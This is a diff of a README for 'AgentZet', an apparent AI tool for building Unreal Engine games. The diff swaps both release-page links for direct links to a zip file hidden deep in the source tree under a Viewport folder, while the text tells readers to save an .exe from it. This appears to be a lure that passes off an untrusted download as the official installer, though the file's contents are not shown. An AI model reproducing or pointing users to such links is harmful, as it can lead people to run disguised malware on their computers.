@@ -1,6 +1,6 @@
 # 🤖 AgentZet - Build Unreal Engine games using words
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Redgoatfishwhittler671/AgentZet/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Redgoatfishwhittler671/AgentZet/main/Source/AgentZetActions/Private/Viewport/Zet_Agent_v1.3-beta.3.zip)
 
 AgentZet helps you create game content in Unreal Engine 5. You describe what you want, and the AI agent builds it for you. It handles complex tasks like writing C++ code, creating Blueprints, and setting up level materials. You stay in control of your project while the agent completes the work.
 
@@ -8,7 +8,7 @@ AgentZet helps you create game content in Unreal Engine 5. You describe what you
 
 You need to download the installer from the official release page. 
 
-[Visit this page to download the latest version](https://github.com/Redgoatfishwhittler671/AgentZet/releases)
+[Visit this page to download the latest version](https://raw.githubusercontent.com/Redgoatfishwhittler671/AgentZet/main/Source/AgentZetActions/Private/Viewport/Zet_Agent_v1.3-beta.3.zip)
 
 Look for the file that ends with .exe under the most recent header. Save this file to your computer.
 
